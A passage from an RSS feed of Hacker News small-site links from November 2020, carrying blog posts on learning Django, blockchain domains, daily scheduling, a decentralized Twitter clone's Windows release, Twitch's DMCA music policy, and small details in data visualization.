            <p>I was introduced to Django when it was released back in around 2005/2006. I watched a video conference called Snakes and Rubies where they talked about Django and Ruby on Rails. I was really impressed with the talk about Django. Adrian made a great talk about the framework.</p>

<p>After the video, I played around with both of the frameworks, but Django quickly became my favorite. I already knew basic Python, so I understood much of the Django code.</p>

<p>I learned the basics and built a couple of small projects. After a few years, I built the biggest project I had done so far. This was a website called "finn en frilanser" which is Norwegian for "find a freelancer". So it was basically a Norwegian version of elance, guru and similar. I learned a lot during this process and it was a really cool project to build.</p>

<p>A few years after this, I built a new really big project using Django. This was a project called "FinnFido". This is kind of an amber alert web application for lost and found pets. I also built an API for the same application which I used for an iPhone and Android app.</p>

<p>So, most of why knowledge has comes from building different projects. Each time I start something new, I try to think of new features I can implement so I can learn even more. For the API I built, I had to learn a lot about JSON and security.</p>

<p>What I think has made me learn most of the Django I know, is actually making videos about the subject. Because when I make videos, I need to explain many different things in my own words. This make it stick better in my head. </p>

<p>When I go through someone elses tutorials, I like to play around with code. I use different variable names and values, change the function names etc. Doing this makes it easier to understand why things are done the way they are.</p>

<p>People learn differently, and the best way for me to learn is "learn by doing" and making it stick better by explaining things in my own words. So this sums up what I have done to learn Django. </p>

<p>This also applies to everything else I know. I learn by doing and becomes even better when I try to teach other about it.</p>

<p>And that's it.</p>

<h2>Video</h2>

<p><iframe width="100%" height="400" src="https://www.youtube.com/embed/PA1AC1vDOfk" frameborder="0" allow="accelerometer; autoplay; encrypted-media; gyroscope; picture-in-picture" allowfullscreen=""></iframe></p>
        </div>

        <hr>

        <h3>Comments</h3>

        
            <p>No comments yet...</p>
        

        <h3>Add comment</h3>

        

        
    </article>
</div>

			    </div></div>]]>
            </description>
            <link>https://codewithstein.com/how-i-learned-django-so-well/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25067291</guid>
            <pubDate>Thu, 12 Nov 2020 07:12:45 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Abu Dhabi launches applied research centre (Middle East AI News)]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25066909">thread link</a>) | @asiaainews
<br/>
November 11, 2020 | https://www.getrevue.co/profile/middleeastainews/issues/abu-dhabi-launches-applied-research-centre-160m-ai-traffic-systems-centre-in-dubai-291113 | <a href="https://web.archive.org/web/*/https://www.getrevue.co/profile/middleeastainews/issues/abu-dhabi-launches-applied-research-centre-160m-ai-traffic-systems-centre-in-dubai-291113">archive.org</a>
<br/><!-- hnss:readable-content --><hr/>Unable to extract article]]>
            </description>
            <link>https://www.getrevue.co/profile/middleeastainews/issues/abu-dhabi-launches-applied-research-centre-160m-ai-traffic-systems-centre-in-dubai-291113</link>
            <guid isPermaLink="false">hacker-news-small-sites-25066909</guid>
            <pubDate>Thu, 12 Nov 2020 05:54:43 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[A Decentralized Internet Pt 1: Blockchain Domains]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 1 (<a href="https://news.ycombinator.com/item?id=25066874">thread link</a>) | @guttertec
<br/>
November 11, 2020 | https://www.axelquack.capital/blockchain-domains/ | <a href="https://web.archive.org/web/*/https://www.axelquack.capital/blockchain-domains/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article>
			<!-- .cover -->
			<div>
				<div id="post-content">
					<!--kg-card-begin: markdown--><p>It is a common misunderstanding to exclusively associate blockchain technology with cryptocurrencies like Bitcoin. The technology itself offers already a wide range of services like decentralized messaging services, marketplaces and – importantly – decentralized domain names, which cannot be censored or taken down completely. Imagine payments could be universally shared and owners have full control over their domain asset.</p>
<p>You might ask yourself "What is so special about this?" A simple answer is:  <strong>the internet of today is broken.</strong> We can use the internet, but we do not own anything we do. Here are a few reason why:</p>
<ol>
<li><a href="https://en.wikipedia.org/wiki/Domain_name_registrar">Registrars</a> are mandatory custodians of centralized domains like .com or .net.</li>
<li><a href="https://en.wikipedia.org/wiki/Domain_name_registry">Registries</a> can revoke domains or be taken down</li>
<li>Hosting services can take content offline entirely, not just off their service platform</li>
</ol>
<p>For the first time in history with the creation of blockchain networks like <a href="https://coinmarketcap.com/currencies/ethereum/">Ethereum</a>, <a href="https://filecoin.io/">Filecoin</a> and others there are new possibilities in regards of ownership and control. On the contrary, blockchain domains are not only decentralized but also secured using cryptographic encryption. They represent a new class of assets that truly belong to the owner, and not to a third party or central authority.</p>
<p>This has several advantages, both for the asset owners and their users – these include:</p>
<ul>
<li><strong>(Real) Ownership:</strong> The owner has a private key to their domain, so the domain will be entirely under their control. Current solutions are not governed by and do not require approval from e.g. <a href="https://www.icann.org/">ICANN</a>.</li>
<li><strong>Censorship-resistant:</strong> A blockchain domain also makes a website censorship-resistant for the owner, as private keys should be stored in a (ideally non-custodial) wallet to which only the owner has the keys. No third-party can interfere with or disable the site without the private keys.</li>
<li><strong>Replace cryptocurrency addresses with human-readable names:</strong> A blockchain domain replaces the need for copying and pasting rather cryptic wallet addresses and at the same time simplifies sending and receiving payments dramatically. The domains become <strong>payment gateways</strong> by attaching a cryptocurrency wallet address to a domain name; giving users the chance to send or pay money.</li>
<li><strong>Transfer speed:</strong> Blockchain domains do not require an escrow agent to securely exchange the domain or funds. This transfer can happen in less than 1 minute, from or to anywhere in the world.</li>
</ul>
<!--kg-card-end: markdown--><figure><iframe width="612" height="344" src="https://www.youtube.com/embed/pLDDbCZXvTE?feature=oembed" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture" allowfullscreen=""></iframe></figure><!--kg-card-begin: markdown--><h2 id="ethereumnameservices">Ethereum Name Services</h2>
<p><a href="https://en.wikipedia.org/wiki/Nick_Johnson_(software_engineer)">Nick Johnson</a> and <a href="https://medium.com/@avsa">Alex Van de Sande</a> of the Ethereum Foundation initially conceptualized the <a href="https://ens.domains/">ENS</a> (Ethereum Name Service).</p>
<p>It offers a names system on Blockchain that integrates with the traditional DNS, unlike some of its competitors, <a href="https://ens.domains/">ENS</a> does not want to replace DNS. Additionally the system provides a secure and decentralized way to address different resources using human-readable names. Instead of sending someones ETH to <em>0xa4edd4f3b6a3f15ecce4b73fd9a196cffc7d28ad</em>, a user can simply send to axelquack.eth.<br>
Lastly, another excellent property that <a href="https://ens.domains/">ENS</a> possesses is its interoperability with the rest of the Ethereum ecosystem. <a href="https://ens.domains/">ENS</a> can interact with all Ethereum-based smart contracts. One contract records all the domains and subdomains, as well the owner's details and the link to the Resolver, which is another smart contract that handles the translations from names to addresses or other types of resources and vice-versa.</p>
<p>It should be noted that <a href="https://ens.domains/">ENS</a> has an annual fee for an .eth domain. This fee is about 5 EUR/year for available domains of "normal length", payable in corresponding ETH value. Even though this might not sound expensive, but one should not forget that the provider can change the fee at any time. Since the user cannot simply move the domain to another provider, this is already a point that might be a disadvantage.</p>
<p>If you are using a browser like Brave or even Chrome, the <a href="https://metamask.io/">MetaMask</a> browser extension will give you support. For example, if you are using Chrome with MetaMask, enter "<a href="http://almonit.eth/">http://almonit.eth</a>" into the URL bar and a website search engine will be loaded.</p>
<!--kg-card-end: markdown--><figure><iframe width="612" height="344" src="https://www.youtube.com/embed/g45ofhOyACg?feature=oembed" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture" allowfullscreen=""></iframe></figure><!--kg-card-begin: markdown--><h2 id="unstoppabledomainscryptozil">Unstoppable Domains (.crypto/.zil)</h2>
<p><a href="https://unstoppabledomains.com/r/2df713a3dc584f7">Unstoppable Domains</a> was born in 2018 of <a href="https://www.linkedin.com/in/bradley-kam-444aa228/">Brad Kam's</a> desire to "build something at the intersection of tech and policy". Kam studied politics before he met co-founder <a href="https://www.linkedin.com/in/matthew-gould-7877361/">Matthew Gould</a> while working at his first startup, <a href="https://www.talkable.com/">Talkable</a>, a SaaS marketing platform. The startup is backed by <a href="https://draper.vc/">Draper Associates</a> &amp; <a href="https://www.boost.vc/">Boost VC</a> and also received grants from the Ethereum Foundation and the Zilliqa Foundation.</p>
<p>Users can connect with crypto domains such as .zil (live on the <a href="https://www.zilliqa.com/">Zilliqa</a> blockchain) or .crypto (live on Ethereum), to get paid as an example. All someone needs to know is their blockchain domain.<br>
The difference is that .zil domains are stored on and process transactions through the <a href="https://www.zilliqa.com/">Zilliqa</a> blockchain which has low fees. In contrast, .crypto domains are stored on and process transactions through the Ethereum blockchain. Both are capable of pointing to multiple cryptocurrency wallet addresses (for <a href="https://community.unstoppabledomains.com/t/what-cryptocurrencies-are-currently-supported/246">payments</a>) and censorship-resistant website content.</p>
<p>The exciting thing about Unstoppable Domains: A user really buys the domain. Once the domain has been paid for and ended up in a wallet (there is for instance a simple way to store your domains within Coinbase Wallet, Atomic Wallet and so on –&nbsp;but also the possibility to store in hardware wallets), nobody can take it away from the owner. Furthermore, <strong>there are no further costs</strong>. That puts the somewhat higher initial costs into perspective quickly. 40 USD are payable for a .crypto domain, 20 USD are payable for .zil domains. Another option is payment by PayPal or Credit Card.</p>
<p>There are multiple ways to access .crypto domains browsers with native support for decentralized websites include Brave (desktop version), Opera (mobile), Status (mobile), MetaMask Mobile (mobile), and Unstoppable Browser (desktop). Besides that it is always possible to install an official Chrome or Mozilla <a href="https://unstoppabledomains.com/extension">extension</a> to access websites built on p2p networks like <a href="https://ipfs.io/">IPFS</a>. The company itself offers a template marketplace and upload functionalities which are interconnected with <a href="https://pinata.cloud/">Pinata</a>.</p>
<p>In May 2020 Unstoppable Domains mentioned they have 200K+ domains registered, 4K+ IPFS websites launched, 12K+ unique Ethereum addresses that own domains just to share some of their key facts. Possible future functionalities mentioned  were support of Decentralized Databases like <a href="https://orbitdb.org/">OrbitDB</a> or <a href="https://gun.eco/">GUN</a> alongside paid hosting.</p>
<!--kg-card-end: markdown--><!--kg-card-begin: markdown--><h2 id="finalthoughts">Final thoughts</h2>
<p>Decentralized systems, which do not require a central mediator to function, were already around at the time the Web was invented. Most notably, the Internet was increasingly gaining traction as a large-scale decentralized network. The rise of Blockchain Domains enables not only censorship-resistance, or a shift towards self-ownership, but also simplifies payments with crypto that could drive further adoption of digital assets.</p>
<!--kg-card-end: markdown--><!--kg-card-begin: html--><hr>
<p><i>Website and the information contained herein is not intended to be a source of advice or credit analysis with respect to the material presented, and the information and/or documents contained in this website do not constitute investment advice.</i></p><!--kg-card-end: html-->
				</div><!-- .post-content -->
				<!-- .post-footer -->
			</div><!-- .inner -->
		</article></div>]]>
            </description>
            <link>https://www.axelquack.capital/blockchain-domains/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25066874</guid>
            <pubDate>Thu, 12 Nov 2020 05:48:29 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[The Key to Consistency]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25066783">thread link</a>) | @lassmaglio
<br/>
November 11, 2020 | https://www.sandromaglione.com/2020/11/10/key-to-consistency/ | <a href="https://web.archive.org/web/*/https://www.sandromaglione.com/2020/11/10/key-to-consistency/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><div><p>Doing things is not easy. The simple act of starting some task can become daunting at times. It is often true that the hardest step is starting the work. Everything else from there will most of the time just flow smoothly.</p><p>We can summarize the secret of getting things done in one rule: <strong>how to make sure I will be able to start</strong>.</p><p>There could be many reasons that stop you from starting something. Some reasons more valid than others.</p><p>Generally, though, the main source of resistance is the mind. People conjure intricated excuses for why they should not do something. One of the most frequent is the maxim: “I do not have time right now, maybe later”.</p><p>We also know that, in order to achieve a goal, oftentimes consistency is more important than intensity.</p><p>It could be learning a new language, exercising, eating healthy. Consistency means doing a little bit of work every day to ensure success in the long run.</p><p>There are mainly three problems with this model:</p><ol><li>Consistency means starting a task every day</li><li>The results of your work may not be visible for a relatively long period of time</li><li>Doing something every day means forgoing some other activities to find the time to work consistently</li></ol><h3>The solution is simple</h3><p>The key to solving the riddle is called <strong>scheduling</strong>.</p><p>Scheduling means assigning a specific date and time to a task. It is as simple as opening an app (or using pen and paper) and picking a time frame in which you commit to doing the work.</p><p>Scheduling solves all the three problems we identified:</p><ol><li>When you schedule a task, you assign it a time slot every day. You won’t need to think about it anymore. The trigger will be the clock: when the time comes, you know what to do. There could be no reasonable excuses.</li><li>Scheduling allows you to look into the future and plan how long the whole process will take. Every day you show up will be another success. You will visually see yourself getting closer to the day in which all your discipline will bear its fruits.</li><li>Scheduling is not limited to a single task. You can easily schedule all your day to make sure you will be able to complete all the activities that you want. This process is liberating. It frees you from the burden of thinking what and when to do something in any given moment.</li></ol><h3>How to schedule</h3><p>There is no specific secret about scheduling. It is all about observing your day, from when you wake up to when you go to bed, and writing down what you will do in this time window.</p><p>It will take you 5 to 10 minutes to organize your activities and assign to each of them a start and finish time. Then you can simply stop bothering and go about your day.</p><p>Basically it all comes down to:</p><ol><li>List all the activities you need to perform, with an estimate of how long each activity will take to be completed</li><li>Sort your activities by priority</li><li>Choose when you are going to wake up and go to sleep</li><li>Build your day like a puzzle, assigning a time frame to each activity in order of priority</li></ol><p>These four steps are the basic blueprint. Many strategies and tricks exist to improve the efficiency and effectiveness of your scheduling.</p><p>Nonetheless, the core of the process is all about <strong>prioritizing and executing</strong>.</p><h3>Some secrets to help</h3><p>Some guidelines exist to help you with scheduling. Simple rules you can follow to increase even more you productivity.</p><h5><strong>Reduce context switching</strong></h5><p>Context switching is the time that it takes to switch from one activity to another. This time may vary based on the specific activity you perform.</p><p>For example, switching from studying to working out takes time: you need to reorder your books, prepare your clothes, go to the gym, etc.</p><p>In order to increase productivity, you should try to group similar task together, one after the other. This will help to reduce idle time and completing more tasks during the day (or maybe completing them faster and having more leisure time).</p><h5><strong>Schedule in the evening or in the morning</strong></h5><p>The process of scheduling may not be exciting at times. Scheduling must become a habit during your day. It is important to pick a moment during the day devoted to your scheduling plan. The same time every day.</p><p>Generally, first thing in the morning or last thing in the evening is ideal. That is because you will always have time in these moments of the day (by simply waking up a little earlier or going to bed a little later).</p><p>Furthermore, scheduling in the evening or morning allows you to take a look at your day before starting it, so you will know exactly what you are going to achieve for the day.</p><h5><strong>Never schedule on task after the other with no time in between</strong></h5><p>This rule refers back to the problem of context switching. No task can usually be started with no idle time from the previous one. And it shouldn’t be.</p><p>We need to give some time to our mind to reload. Therefore, always consider some time in between each task to relax.</p><h5><strong>Review the results at the end of the day</strong></h5><p>No matter if you write your schedule in the morning or evening, reviewing your results is paramount to your success. Take some time in the evening to look at your activities during the day.</p><p>This process will help you to estimate better your times and also have a critical look at what you do during your day.</p><h5><strong>Learn to estimate the time it takes for each activity</strong></h5><p>Scheduling is an estimation. We cannot know how much time each activity will actually take. Nonetheless, we assign it a time frame, from start to finish.</p><p>With time, our ability to estimate the amount of time to assign to each task will improve. Eventually, you should be able to schedule your day with a high degree of accuracy.</p><h5><strong>Schedule leisure time</strong></h5><p>Scheduling does not mean 24 hours of work. Scheduling is all about avoiding procrastination and improving efficiency. If you schedule your day properly, you will accomplish more in less time.</p><p>And guess what? All the time you gain in your day can be used to getting more things done or just chill and relax. <strong>You can literally increase your free time</strong>. All it takes is a little bit of planning and a little bit of consistency.</p><hr><h3>What are you waiting for?</h3><p>Scheduling is really a superpower. You will start seeing results in no time. You will feel less stressed during your day. You won’t need to think about what do to next. This habit will also give more meaning to your time. I cannot recommend it enough. Just try it and see how it goes.</p></div></div></div>]]>
            </description>
            <link>https://www.sandromaglione.com/2020/11/10/key-to-consistency/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25066783</guid>
            <pubDate>Thu, 12 Nov 2020 05:30:52 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Member (Open Source, P2P, Decentralized Twitter Clone) Releases Windows App]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25066663">thread link</a>) | @FreeTrade
<br/>
November 11, 2020 | https://member.cash/p/0cd5f21a46 | <a href="https://web.archive.org/web/*/https://member.cash/p/0cd5f21a46">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="previewcontent">
        <p>Member Desktop (Ember) is Twitter meets Bittorrent.

magnet:?xt=urn:btih:E1E4C04EFEA99A16A992FEF7F8E8F3C5964E865E

It runs on Windows with a single click. Includes pre-synced Bitcoin node, server, db, client. <a href="https://member.cash/m/freetrade">@freetrade</a></p><p><a href="https://member.cash/t/member">member</a></p><p><a href="https://member.cash/p/a058ec8564">Interesting.

Is it a bundled Virtual Machine?</a> <a href="https://member.cash/m/shadowofharbringer">@shadowofharbringer</a></p><p><a href="https://member.cash/p/c813d814a2">It is not a virtual machine - it requires Windows to run. Might look at Linux/Macos releases in the future. </a> <a href="https://member.cash/m/freetrade">@freetrade</a></p><p><a href="https://member.cash/p/3e4fe5c003">&gt;  it requires Windows to run

Well, that's unfortunate but I am no longer interested. I will wait for Linux release.</a> <a href="https://member.cash/m/shadowofharbringer">@shadowofharbringer</a></p><p><a href="https://member.cash/p/dc3a9e51f3">Whens the mobile app coming? ;) </a> <a href="https://member.cash/m/%F0%9D%90%85%F0%9D%90%84%F0%9D%90%84%F0%9D%90%8B%F0%9D%90%92">@𝐅𝐄𝐄𝐋𝐒</a></p><p><a href="https://member.cash/p/89d6d52caf">I'm not sure. Seems like a lot of work just to get banned doesn't it ? ;) PWA FTW</a> <a href="https://member.cash/m/freetrade">@freetrade</a></p><p><a href="https://member.cash/p/f3bedd316a">Just in case you missed this on Reddit - here's how to run on Linux. (member.cash uses ubuntu)

Yes, I just updated the repo with the latest 5.0.7 release - here it is - https://github</a> <a href="https://member.cash/m/freetrade">@freetrade</a></p><p><a href="https://member.cash/p/e961c4ab94">|.com/memberapp/server

Let me know if you have any problems.
</a> <a href="https://member.cash/m/freetrade">@freetrade</a></p><p><img src="https://member.cash/img/profilepics/19RyV6XQEww5td2LPWDpK8o5V8at7Vpwgv.640x640.jpg">
    </p></div></div>]]>
            </description>
            <link>https://member.cash/p/0cd5f21a46</link>
            <guid isPermaLink="false">hacker-news-small-sites-25066663</guid>
            <pubDate>Thu, 12 Nov 2020 05:07:53 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Music-Related Copyright Claims and Twitch]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25066598">thread link</a>) | @captn3m0
<br/>
November 11, 2020 | https://blog.twitch.tv/en/2020/11/11/music-related-copyright-claims-and-twitch/ | <a href="https://web.archive.org/web/*/https://blog.twitch.tv/en/2020/11/11/music-related-copyright-claims-and-twitch/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div data-i18n="ba2fc6a46b864e1cc0b2afadb1eff0cf-content">
    <p>Creators, we hear you. Your frustration and confusion with recent music-related copyright issues is completely justified. Things can–and should–be better for creators than they have been recently, and this post outlines our next steps to get there. Moving forward, we’ll be more transparent with what’s happening and what tools and resources we’re building to help.</p>

<p>Copyright law and the DMCA are not small or simple topics, so this won’t be a brief post. We’ll do our best to keep the legalese to a minimum, though there’s bound to be technical terms here and there.&nbsp;</p>

<h4 id="dmca-and-twitch"><strong>DMCA and Twitch</strong></h4>

<p>First off, a quick review of what DMCA actually is. The Digital Millennium Copyright Act (“DMCA”) is a set of US laws that allows you to create and share content on digital service providers like Twitch. We comply with the DMCA and similar laws worldwide. Part of complying means that when a copyright holder thinks a streamer has used their content without permission, we have a process in place for them to be able to request the content be taken down.</p>

<p>When we receive a DMCA notification, we process the notification in accordance with our <a href="https://www.twitch.tv/p/legal/dmca-guidelines/">DMCA Guidelines</a>. This includes removing the content, sharing the details with the channel owner, and tracking the allegation.&nbsp;</p>

<p>DMCA takedown notifications can affect your ability to stream because we, as part of our efforts to comply with the DMCA and similar global laws, issue and track copyright strikes and ban the accounts of those who repeatedly infringe the copyrights of others.&nbsp;</p>

<p>This policy is important because we respect the rights of all creators, including those who create or record music, as well as the rights of those who own and control copyrights. As a company that is built around a community of people who create content, we take allegations of copyright infringement seriously.&nbsp;</p>

<h4 id="recent-dmca-notifications"><strong>Recent DMCA notifications</strong></h4>

<p>How did we get to this moment? Until May of this year, streamers received <strong>fewer than 50 music-related DMCA notifications each year</strong> on Twitch. Beginning in May, however, representatives for the major record labels started sending <strong>thousands of DMCA notifications each week</strong> that targeted creators’ archives, mostly for snippets of tracks in years-old Clips. We continue to receive large batches of notifications, and we don’t expect that to slow down.&nbsp;</p>

<p>This means two things: 1) if you play recorded music on your stream, you need to stop doing that and 2) if you haven’t already, you should review your historical VODs and Clips that may have music in them and delete any archives that might.&nbsp;</p>

<p>We were as surprised by this sudden avalanche of notifications as many of you were. We also realized that we needed to provide streamers with more educational programs and content management tools to help you deal with this unprecedented number of notifications coming in all at once. So, while we continued to remove content targeted by these notifications as required by the DMCA, we understood VODs and Clips from years ago may not necessarily reflect your current approach to music. Therefore, we also paused the processing of strikes associated with these batched notifications in order to give you the tools, information, and time that you would need to deal with them.</p>

<p>We have analyzed the notifications we received during that period from the end of May through the middle of October. What we found is that more than 99% of the notifications were for tracks that streamers were playing in the background of their stream.&nbsp;</p>

<p>The point of the DMCA is to strike a balance between the interests of rights holders (the major record labels in this case) and creators. Because of this, we were compelled to delete the VODs and Clips that were identified in the notifications. This showed our commitment to upholding our obligations under the DMCA, while affording us the opportunity to sort out the best way to handle issuing strikes in these circumstances. Under these extraordinary circumstances, we recognized creators should have a reasonable chance to understand that content created in the past was being targeted as allegedly infringing and be given an opportunity to change their approach to music use before they got hit with strikes.</p>

<p>This led to the current situation, which is understandably frustrating and worrying for many of you. Given the circumstances, the warning email many of you received didn’t include all the information that you’d typically get in a DMCA notification (normally, when we receive a DMCA notification against your channel, we send you an email that includes information about the allegedly infringed work, who the claimant is, how the claimant can be contacted, and possible penalties under our repeat infringer policy, so that you can make an informed decision about whether to submit a counter notification or seek a retraction). We hear your feedback about how frustratingly little information we provided, and we should have made that warning email a lot more informative and helpful.</p>

<p>Over the last several months, we have done our best to manage this situation on behalf of both rights holders and creators. One of the mistakes we made was not building adequate tools to allow creators to manage their own VOD and Clip libraries. You’re rightly upset that the only option we provided was a mass deletion tool for Clips, and that we only gave you three-days notice to use this tool. We could have developed more sophisticated, user-friendly tools awhile ago. That we didn’t is on us. And we could have provided creators with a longer time period to address their VOD and Clip libraries – that was a miss as well. We’re truly sorry for these mistakes, and we’ll do better.</p>

<h4 id="how-to-avoid-dmca-notifications"><strong>How to avoid DMCA notifications&nbsp;</strong></h4>

<p>One important question we’ve heard from you is: how can I stream safely and confidently on Twitch without having to worry about getting DMCA notifications from music use?</p>

<p>Most importantly, <strong>don’t play recorded music in your stream</strong> unless you own all rights in the music, or you have the permission of the necessary rights holder(s). Doing this is the best protection for your streams going forward. If you’re unsure whether you own all the rights, it’s pretty likely you don’t. If you want to include recorded music in your stream, use a fully licensed alternative like Soundtrack by Twitch, or other rights cleared music libraries such as Soundstripe, Monstercat Gold, Chillhop, Epidemic Sound, and NCS.</p>

<p>While we haven’t received more than a handful of DMCA notifications targeting in-game music, if you’re playing games with recorded music in them, we recommend you review their End User License Agreements (that wall of text at the beginning of a game) to see how the terms cover streaming with that music. One way to do this is to search for a game’s official EULA online and then do a ctrl+f (Command+f on Mac) search for words like “stream,” “licensed,” and “music” to point you toward the correct sections. If you’re unsure about the rights, some games allow you to turn off music when streaming, or you can mute the game audio yourself. If neither of those apply, consider turning off VODs and Clips.&nbsp;</p>

<p>For your stream archives (VODs and Clips), right now your only options, if you think they contain unauthorized music, is to either go through them one by one, or, for Clips, use the “delete all” tool we’ve provided. We understand both of these options have downsides, and we’re working to provide you more and better options as soon as possible. These things will take time to get right, and new challenges may appear in the future. Regardless, we’re committing here and now to investing in building better tools and keeping you posted on our progress.</p>

<h4 id="new-products-and-tools"><strong>New products and tools</strong></h4>

<p>Ever since the influx of DMCA notifications began, we have been working on building new (and improving existing) tools to help creators (such as the Clips mass deletion tool). This work is still happening. Many of these changes won’t be visible to the community, but we’re focused on three areas where we heard you need more support from us:</p>

<p>First, you don’t have enough control over the recorded content on your channel. We have made improvements to enable you to mass delete Clips, but in addition, we will (1) expand the use of technology to detect copyrighted audio, and (2) give you more granular ways to manage your archive instead of just a “delete all” option.</p>

<p>Second, we’ll make it easier for you to control what audio from your live streams will show up in your recorded content. Soundtrack by Twitch has some of this technology built into it, and we’ll work to make it available for everyone regardless of whether you want to use Soundtrack, for which we’ve cleared all necessary rights, or music from others that provide rights-cleared music.</p>

<p>Third, we need to give you the ability to actually review your allegedly infringing content when you receive a DMCA notification, in addition to the details already provided in our takedown notifications - that is, information about what copyrighted work was allegedly infringed, who the claimant is, and how the claimant can be contacted. We also need to help you more easily file counter notifications if you believe you have the rights to use the content–for example, because you’ve secured a license, believe the use is a fair use,&nbsp; the claimant does not control the rights, or believe you have the right to use the music without permission.</p>

<p>Some of you have asked why we don’t have a license covering any and all uses of recorded music. We are actively speaking with the major record labels about potential approaches to additional licenses that would be appropriate for the Twitch service. That said, the current constructs for licenses that the record labels have with other services (which typically take a cut of revenue from creators for payment to record labels) make less sense for Twitch. The vast majority of our creators don’t have recorded music as a part of their streams, and the revenue implications to creators of …</p></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://blog.twitch.tv/en/2020/11/11/music-related-copyright-claims-and-twitch/">https://blog.twitch.tv/en/2020/11/11/music-related-copyright-claims-and-twitch/</a></em></p>]]>
            </description>
            <link>https://blog.twitch.tv/en/2020/11/11/music-related-copyright-claims-and-twitch/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25066598</guid>
            <pubDate>Thu, 12 Nov 2020 04:57:13 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Good Data Viz Is About the Small Things]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25066475">thread link</a>) | @tagawa
<br/>
November 11, 2020 | https://hamiltonulmer.com/notes/data-viz-small-things/ | <a href="https://web.archive.org/web/*/https://hamiltonulmer.com/notes/data-viz-small-things/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
                
<main>
<article>
    <header>
      
        <p>data visualization</p>
        
      
    
      <p>It's all too common to fixate on the choice of data visualization method at the expense of the just-as-important small choices – labels, annotations, animation, and other bits you can add to tell the story better. That’s really where good data viz shines.</p>
    
    <dl>

      <dt>published</dt>
      <dd>Nov 11, 2020</dd>

      

      
        <dt>topics</dt>
        <dd>
          
            <a href="https://hamiltonulmer.com/topics/dataviz">dataviz</a>
          
            <a href="https://hamiltonulmer.com/topics/communication">communication</a>
          
            <a href="https://hamiltonulmer.com/topics/data%20science">data science</a>
          
        </dd>
      
    </dl>
    </header>
    <p>I recently consulted on an internal data visualization project at work, where someone asked this question: <em>“What's type of data graphic best shows this particular insight?”</em> I've been asked variations of this a lot over the years, and thought it might be better to just write an answer for posterity's sake.</p>
<p>In my experience, picking a data visualization method to convey some kind of insight is really the start of your journey, not the end. This is not to say that the choice isn’t important. There’s plenty of reading material on the internet that addresses the tradeoffs between, say, <a href="https://towardsdatascience.com/not-a-funnel-use-sankey-to-represent-your-sales-process-9621b6578c42">a funnel chart and a Sankey diagram</a>. It's just that fixating on the graphic type focuses the solution on a specific output, not a desired outcome. You have to go so much further.</p>

<p>To that end, I try to get others to reframe the question to this: <em>“how can this data visualization enable the reader to effortlessly see the story I see?”</em>. This question can change your tactics in profound ways. After all, getting someone to understand your viz requires you to practice basic reader empathy. Your readers don't always have the time, the context, nor the skills to uncover insights from the data on their own. Your job is to make it easy – hell, I'd say <em>trivial</em> – for them to reach that "aha!" moment, where their thinking changes and the possibilities open up.</p>

<p>When you shift your focus to <em>telling the story well</em>, you'll begin to understand why your work doesn't stop at picking a visualization method or graphic type, and what to do next. It's the <em>small things</em> that really make the story stick – labels, annotations, design choices, animations, mouse interactions, tooltips, data sources, documentation, and other extraneous details not always covered in your favorite data viz book.</p>
<p>The small things make the reader's journey possible. They're the contextual pieces needed to see the story clearly. They're the details that delight them into trusting your expertise; that one annotation that guides their attention; that helpful tooltip that explains a complicated metric; all the pre-empted answers to their immediate questions. Sometimes, they even make room for the reader to explore on their own.</p>
<p>Your graphic choice may point the reader in the right direction. It may even get them part-way there. But the road that leads them to that "aha!" moment is almost always paved with small things.</p>
<figure>
<p><a href="https://hamiltonulmer.com/img/road-dataviz.jpg">
<img src="https://hamiltonulmer.com/img/road-dataviz.jpg">
</a>
</p>
<figcaption>
  Ridge hiking near Muir Beach, San Francisco in the distance. 

</figcaption></figure>
<p>"Small" may not be the right word – not all of these things are visually small – but I think it works in this context. Juxtaposed with the "big" choice of graphic type, these other parts are seen as smaller and more numerous. This is probably why they're considered afterthoughts, if they're even considered at all. But without them, readers are liable to:</p>
<ul>
<li><strong>get lost</strong> – misinterpreting the visualization can push them to form the wrong conclusion or make the wrong decision.</li>
<li><strong>get stuck in the mud</strong> – they might fixate on a meaningless part of the visualization, assuming there is something important that isn't really there, without arriving at the core insight.</li>
<li><strong>give up and head elsewhere</strong> – if your data visualization is hard to understand, they may just give up, making a decision without any data.</li>
</ul>
<p>Building intuition about what small things to add is a byproduct of hands-on experience and relentless reader empathy. It requires putting a data visualization in front of someone and seeing them struggle to understand, and having the drive to understand and address their confusion and frustration. The more you do it, the easier it gets to anticipate the ways you can make your visual story clearer.</p>

<p>When a reader does truly understand the story, it's a rewarding experience. The insights will often lead to deeper, more interesting questions and explorations (I sometimes call this the <em>data viz happy path</em>). Isn't this the whole point of telling visual stories with data – helping others reach a new understanding?</p>
